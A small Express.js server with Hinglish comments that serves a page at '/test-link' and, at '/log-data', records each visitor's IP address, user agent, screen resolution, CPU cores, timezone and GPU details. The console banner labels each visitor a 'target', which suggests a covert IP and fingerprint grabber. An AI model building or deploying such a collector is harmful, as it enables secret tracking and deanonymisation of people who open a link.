const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 10000;

// JSON data read karne ke liye middleware
app.use(express.json());

// Jab koi main link ya /test-link khole toh HTML file dikhao
app.get('/test-link', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Frontend se data receive karne ka endpoint
app.post('/log-data', (req, res) => {
    const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const hardware = req.body;

    console.log(`\n============== NAYA TARGET AAYA ==============`);
    console.log(`[+] IP Address: ${userIP}`);
    console.log(`[+] User-Agent: ${userAgent}`);
    console.log(`[+] Screen Resolution: ${hardware.screenWidth}x${hardware.screenHeight}`);
    console.log(`[+] Logical CPU Cores: ${hardware.logicalCores}`);
    console.log(`[+] Timezone: ${hardware.timezone}`);
    console.log(`[+] GPU Vendor: ${hardware.gpuVendor}`);
    console.log(`[+] GPU Renderer: ${hardware.gpuRenderer}`);
    console.log(`==============================================\n`);

    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
